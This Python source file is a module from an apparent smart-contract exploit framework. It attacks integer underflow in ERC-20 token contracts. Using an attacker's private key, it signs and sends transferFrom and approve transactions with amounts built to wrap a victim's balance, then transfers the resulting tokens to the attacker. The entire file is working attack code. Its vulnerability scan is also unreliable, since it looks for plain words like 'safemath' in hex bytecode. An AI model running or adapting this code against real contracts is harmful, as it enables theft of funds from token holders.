"""
Integer Underflow Exploit
SmartSploit Framework - Exploits integer underflow vulnerabilities
"""

from smartsploit.lib.base_module import BaseExploit, ExploitResult, ModuleInfo
from smartsploit.core.blockchain_interface import get_web3_connection
from web3 import Web3
import logging

logger = logging.getLogger(__name__)

class IntegerUnderflowExploit(BaseExploit):
    """Exploit contracts vulnerable to integer underflow attacks"""
    
    def __init__(self):
        super().__init__()
        self.name = "Integer Underflow Exploit"
        self.description = "Exploits integer underflow vulnerabilities in subtraction operations"
        self.author = "SmartSploit Team"
        
        self.info = ModuleInfo(
            name=self.name,
            description=self.description,
            author=self.author,
            references=[
                "SWC-101: Integer Overflow and Underflow",
                "https://consensys.github.io/smart-contract-best-practices/attacks/overflow-underflow/",
                "Integer underflow in token contracts"
            ],
            severity="high",
            targets=["Token contracts", "Balance tracking systems", "Pre-0.8.0 Solidity"]
        )
        
        self.options = {
            "TARGET_CONTRACT": {"value": "", "required": True, "description": "Target contract address"},
            "RPC_URL": {"value": "http://localhost:8545", "required": True, "description": "Blockchain RPC endpoint"},
            "ATTACKER_KEY": {"value": "", "required": True, "description": "Attacker's private key"},
            "VICTIM_ADDRESS": {"value": "", "required": False, "description": "Victim address to target"},
            "UNDERFLOW_AMOUNT": {"value": "1", "required": False, "description": "Amount to cause underflow"},
            "GAS_LIMIT": {"value": "500000", "required": False, "description": "Transaction gas limit"},
            "EXPLOIT_TYPE": {"value": "balance", "required": False, "description": "Exploit type (balance, allowance, supply)"}
        }
        
    def check_requirements(self) -> bool:
        required_options = ["TARGET_CONTRACT", "RPC_URL", "ATTACKER_KEY"]
        for option in required_options:
            if not self.options[option]["value"]:
                logger.error(f"Required option {option} not set")
                return False
        return True
        
    def analyze_underflow_vulnerabilities(self, w3, contract_address: str) -> dict:
        """Analyze contract for underflow vulnerabilities"""
        try:
            code = w3.eth.get_code(contract_address)
            code_hex = code.hex()
            
            analysis = {
                "contract": contract_address,
                "subtraction_operations": [],
                "vulnerable_patterns": [],
                "protection_mechanisms": [],
                "risk_assessment": "low"
            }
            
            # Check for subtraction opcode (0x03)
            if "03" in code_hex:
                analysis["subtraction_operations"].append("SUB opcode detected")
                analysis["risk_assessment"] = "medium"
                
            # Check for vulnerable patterns
            vulnerable_patterns = [
                ("transfer", "Token transfer function"),
                ("burn", "Token burn function"),
                ("withdraw", "Withdrawal function"),
                ("approve", "Approval function"),
                ("decreaseallowance", "Decrease allowance function")
            ]
            
            for pattern, desc in vulnerable_patterns:
                if pattern.lower() in code_hex.lower():
                    analysis["vulnerable_patterns"].append(desc)
                    analysis["risk_assessment"] = "high"
                    
            # Check for protection mechanisms
            protection_patterns = [
                ("require", "Require statements detected"),
                ("safemath", "SafeMath library usage"),
                ("sub", "SafeMath sub function"),
                ("assert", "Assert statements detected")
            ]
            
            for pattern, desc in protection_patterns:
                if pattern.lower() in code_hex.lower():
                    analysis["protection_mechanisms"].append(desc)
                    
            # If protections exist, lower risk
            if analysis["protection_mechanisms"]:
                if analysis["risk_assessment"] == "high":
                    analysis["risk_assessment"] = "medium"
                elif analysis["risk_assessment"] == "medium":
                    analysis["risk_assessment"] = "low"
                    
            return analysis
            
        except Exception as e:
            logger.error(f"Underflow analysis failed: {e}")
            return {"error": str(e)}
            
    def check_balance_states(self, w3, contract_address: str, target_address: str) -> dict:
        """Check current balance states for underflow opportunities"""
        try:
            states = {
                "target_address": target_address,
                "balance": 0,
                "allowances": {},
                "total_supply": 0,
                "underflow_opportunities": []
            }
            
            # Get balance
            try:
                balance_result = w3.eth.call({
                    'to': contract_address,
                    'data': "0x70a08231" + target_address[2:].zfill(64)  # balanceOf(address)
                })
                if balance_result:
                    states["balance"] = int.from_bytes(balance_result, byteorder='big')
            except Exception as e:
                logger.debug(f"Balance check failed: {e}")
                
            # Get total supply
            try:
                supply_result = w3.eth.call({
                    'to': contract_address,
                    'data': "0x18160ddd"  # totalSupply()
                })
                if supply_result:
                    states["total_supply"] = int.from_bytes(supply_result, byteorder='big')
            except Exception as e:
                logger.debug(f"Total supply check failed: {e}")
                
            # Check for underflow opportunities
            if states["balance"] == 0:
                states["underflow_opportunities"].append("Zero balance - underflow possible on transfer")
            elif states["balance"] < 1000:  # Small balance
                states["underflow_opportunities"].append("Low balance - underflow possible with large transfer")
                
            # Check allowances to attacker
            attacker_key = self.options["ATTACKER_KEY"]["value"]
            attacker_address = w3.eth.account.from_key(attacker_key).address
            
            try:
                allowance_result = w3.eth.call({
                    'to': contract_address,
                    'data': "0xdd62ed3e" + target_address[2:].zfill(64) + attacker_address[2:].zfill(64)  # allowance(owner,spender)
                })
                if allowance_result:
                    allowance = int.from_bytes(allowance_result, byteorder='big')
                    states["allowances"][attacker_address] = allowance
                    
                    if allowance > states["balance"]:
                        states["underflow_opportunities"].append("Allowance > balance - transferFrom underflow possible")
            except Exception as e:
                logger.debug(f"Allowance check failed: {e}")
                
            return states
            
        except Exception as e:
            logger.error(f"Balance state check failed: {e}")
            return {"error": str(e)}
            
    def attempt_balance_underflow(self, w3, contract_address: str, target_address: str) -> dict:
        """Attempt to cause balance underflow"""
        try:
            attacker_key = self.options["ATTACKER_KEY"]["value"]
            attacker_account = w3.eth.account.from_key(attacker_key)
            underflow_amount = int(self.options["UNDERFLOW_AMOUNT"]["value"])
            
            # Get current balance
            balance_result = w3.eth.call({
                'to': contract_address,
                'data': "0x70a08231" + target_address[2:].zfill(64)  # balanceOf(address)
            })
            current_balance = int.from_bytes(balance_result, byteorder='big') if balance_result else 0
            
            # Calculate underflow amounts
            underflow_attempts = [
                current_balance + 1,  # Just over balance
                current_balance + underflow_amount,  # Specified amount over
                2**256 - 1,  # Max uint256
                current_balance * 2  # Double balance
            ]
            
            results = {
                "target_address": target_address,
                "initial_balance": current_balance,
                "underflow_attempts": []
            }
            
            for amount in underflow_attempts:
                try:
                    logger.info(f"Attempting underflow with amount {amount}")
                    
                    # Try transferFrom if we have allowance
                    call_data = "0x23b872dd" + target_address[2:].zfill(64) + \
                               attacker_account.address[2:].zfill(64) + hex(amount)[2:].zfill(64)
                    
                    # Get balance before
                    balance_before = w3.eth.call({
                        'to': contract_address,
                        'data': "0x70a08231" + target_address[2:].zfill(64)
                    })
                    balance_before = int.from_bytes(balance_before, byteorder='big') if balance_before else 0
                    
                    # Execute transaction
                    txn = {
                        'to': contract_address,
                        'data': call_data,
                        'gas': int(self.options["GAS_LIMIT"]["value"]),
                        'gasPrice': w3.eth.gas_price,
                        'nonce': w3.eth.get_transaction_count(attacker_account.address),
                        'value': 0
                    }
                    
                    signed_txn = w3.eth.account.sign_transaction(txn, attacker_key)
                    tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
                    
                    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
                    
                    # Get balance after
                    balance_after = w3.eth.call({
                        'to': contract_address,
                        'data': "0x70a08231" + target_address[2:].zfill(64)
                    })
                    balance_after = int.from_bytes(balance_after, byteorder='big') if balance_after else 0
                    
                    # Check for underflow (balance wraps to very large number)
                    underflow_detected = balance_after > 2**200  # Suspiciously large balance
                    
                    attempt_result = {
                        "amount": amount,
                        "success": receipt.status == 1,
                        "tx_hash": tx_hash.hex(),
                        "gas_used": receipt.gasUsed,
                        "balance_before": balance_before,
                        "balance_after": balance_after,
                        "underflow_detected": underflow_detected
                    }
                    
                    if underflow_detected:
                        logger.info(f"Underflow detected! Balance wrapped to {balance_after}")
                        attempt_result["underflow_amount"] = balance_after
                        
                    results["underflow_attempts"].append(attempt_result)
                    
                    # Update nonce
                    attacker_account = w3.eth.account.from_key(attacker_key)
                    
                except Exception as e:
                    results["underflow_attempts"].append({
                        "amount": amount,
                        "success": False,
                        "error": str(e)
                    })
                    
            return results
            
        except Exception as e:
            logger.error(f"Balance underflow attempt failed: {e}")
            return {"error": str(e)}
            
    def attempt_allowance_underflow(self, w3, contract_address: str) -> dict:
        """Attempt to cause allowance underflow"""
        try:
            attacker_key = self.options["ATTACKER_KEY"]["value"]
            attacker_account = w3.eth.account.from_key(attacker_key)
            
            # Try to approve a negative amount (which would underflow)
            underflow_amounts = [
                2**256 - 1,  # Max uint256
                2**255,      # Large value
                0            # Zero (for decreaseAllowance underflow)
            ]
            
            results = {
                "allowance_attempts": []
            }
            
            for amount in underflow_amounts:
                try:
                    logger.info(f"Attempting allowance underflow with amount {amount}")
                    
                    # Try approve with large amount
                    call_data = "0x095ea7b3" + attacker_account.address[2:].zfill(64) + hex(amount)[2:].zfill(64)
                    
                    txn = {
                        'to': contract_address,
                        'data': call_data,
                        'gas': int(self.options["GAS_LIMIT"]["value"]),
                        'gasPrice': w3.eth.gas_price,
                        'nonce': w3.eth.get_transaction_count(attacker_account.address),
                        'value': 0
                    }
                    
                    signed_txn = w3.eth.account.sign_transaction(txn, attacker_key)
                    tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
                    
                    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
                    
                    # Check new allowance
                    allowance_result = w3.eth.call({
                        'to': contract_address,
                        'data': "0xdd62ed3e" + attacker_account.address[2:].zfill(64) + attacker_account.address[2:].zfill(64)
                    })
                    new_allowance = int.from_bytes(allowance_result, byteorder='big') if allowance_result else 0
                    
                    results["allowance_attempts"].append({
                        "amount": amount,
                        "success": receipt.status == 1,
                        "tx_hash": tx_hash.hex(),
                        "new_allowance": new_allowance,
                        "underflow_detected": new_allowance > 2**200
                    })
                    
                    # Update nonce
                    attacker_account = w3.eth.account.from_key(attacker_key)
                    
                except Exception as e:
                    results["allowance_attempts"].append({
                        "amount": amount,
                        "success": False,
                        "error": str(e)
                    })
                    
            return results
            
        except Exception as e:
            logger.error(f"Allowance underflow attempt failed: {e}")
            return {"error": str(e)}
            
    def exploit_underflow_for_tokens(self, w3, contract_address: str, successful_underflows: list) -> dict:
        """Exploit successful underflow to gain tokens"""
        try:
            if not successful_underflows:
                return {"success": False, "message": "No successful underflows to exploit"}
                
            attacker_key = self.options["ATTACKER_KEY"]["value"]
            attacker_account = w3.eth.account.from_key(attacker_key)
            
            exploitation_results = []
            
            for underflow in successful_underflows:
                try:
                    if underflow.get("underflow_detected"):
                        logger.info(f"Exploiting underflow from transaction {underflow['tx_hash']}")
                        
                        # Try to transfer the underflowed amount to attacker
                        underflow_balance = underflow.get("underflow_amount", 0)
                        if underflow_balance > 0:
                            # Transfer some of the underflowed tokens
                            transfer_amount = min(underflow_balance // 2, 2**128)  # Transfer half or reasonable amount
                            
                            call_data = "0xa9059cbb" + attacker_account.address[2:].zfill(64) + hex(transfer_amount)[2:].zfill(64)
                            
                            txn = {
                                'to': contract_address,
                                'data': call_data,
                                'gas': int(self.options["GAS_LIMIT"]["value"]),
                                'gasPrice': w3.eth.gas_price,
                                'nonce': w3.eth.get_transaction_count(attacker_account.address),
                                'value': 0
                            }
                            
                            signed_txn = w3.eth.account.sign_transaction(txn, attacker_key)
                            tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
                            
                            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
                            
                            # Check attacker's new balance
                            attacker_balance = w3.eth.call({
                                'to': contract_address,
                                'data': "0x70a08231" + attacker_account.address[2:].zfill(64)
                            })
                            attacker_balance = int.from_bytes(attacker_balance, byteorder='big') if attacker_balance else 0
                            
                            exploitation_results.append({
                                "original_underflow": underflow["tx_hash"],
                                "exploitation_tx": tx_hash.hex(),
                                "success": receipt.status == 1,
                                "transfer_amount": transfer_amount,
                                "attacker_final_balance": attacker_balance
                            })
                            
                            # Update nonce
                            attacker_account = w3.eth.account.from_key(attacker_key)
                            
                except Exception as e:
                    exploitation_results.append({
                        "original_underflow": underflow.get("tx_hash"),
                        "success": False,
                        "error": str(e)
                    })
                    
            successful_exploits = [r for r in exploitation_results if r.get("success")]
            
            return {
                "success": len(successful_exploits) > 0,
                "exploitation_attempts": exploitation_results,
                "successful_exploits": len(successful_exploits),
                "total_tokens_gained": sum(r.get("attacker_final_balance", 0) for r in successful_exploits)
            }
            
        except Exception as e:
            logger.error(f"Underflow exploitation failed: {e}")
            return {"success": False, "error": str(e)}
            
    def run(self) -> dict:
        """Main exploit execution"""
        if not self.check_requirements():
            return {"result": ExploitResult.ERROR, "message": "Requirements check failed"}
            
        try:
            w3 = get_web3_connection(self.options["RPC_URL"]["value"])
            contract_address = self.options["TARGET_CONTRACT"]["value"]
            exploit_type = self.options["EXPLOIT_TYPE"]["value"]
            
            # Analyze contract for underflow vulnerabilities
            analysis = self.analyze_underflow_vulnerabilities(w3, contract_address)
            if "error" in analysis:
                return {"result": ExploitResult.ERROR, "message": f"Analysis failed: {analysis['error']}"}
                
            if analysis["risk_assessment"] == "low":
                return {"result": ExploitResult.FAILED, "message": "Low underflow risk detected"}
                
            # Check current states
            victim_address = self.options["VICTIM_ADDRESS"]["value"]
            if not victim_address:
                # Use a common address or try to find one with balance
                victim_address = "0x1234567890123456789012345678901234567890"
                
            balance_states = self.check_balance_states(w3, contract_address, victim_address)
            
            # Attempt underflow based on type
            underflow_results = {}
            successful_underflows = []
            
            if exploit_type in ["balance", "all"]:
                logger.info("Attempting balance underflow...")
                balance_underflow = self.attempt_balance_underflow(w3, contract_address, victim_address)
                underflow_results["balance_underflow"] = balance_underflow
                
                if balance_underflow.get("underflow_attempts"):
                    successful_underflows.extend([u for u in balance_underflow["underflow_attempts"] if u.get("underflow_detected")])
                    
            if exploit_type in ["allowance", "all"]:
                logger.info("Attempting allowance underflow...")
                allowance_underflow = self.attempt_allowance_underflow(w3, contract_address)
                underflow_results["allowance_underflow"] = allowance_underflow
                
                if allowance_underflow.get("allowance_attempts"):
                    successful_underflows.extend([u for u in allowance_underflow["allowance_attempts"] if u.get("underflow_detected")])
                    
            # Exploit successful underflows
            exploitation_result = {}
            if successful_underflows:
                logger.info("Exploiting successful underflows...")
                exploitation_result = self.exploit_underflow_for_tokens(w3, contract_address, successful_underflows)
                
            result = {
                "result": ExploitResult.SUCCESS if successful_underflows else ExploitResult.FAILED,
                "message": f"Integer underflow exploit completed - {len(successful_underflows)} underflows found",
                "analysis": analysis,
                "balance_states": balance_states,
                "underflow_results": underflow_results,
                "exploitation_result": exploitation_result,
                "exploit_type": exploit_type
            }
            
            if successful_underflows:
                logger.info("Integer underflow exploit successful!")
            else:
                logger.warning("No exploitable underflows found")
                
            return result
            
        except Exception as e:
            logger.error(f"Integer underflow exploit failed: {e}")
            return {"result": ExploitResult.ERROR, "message": str(e)}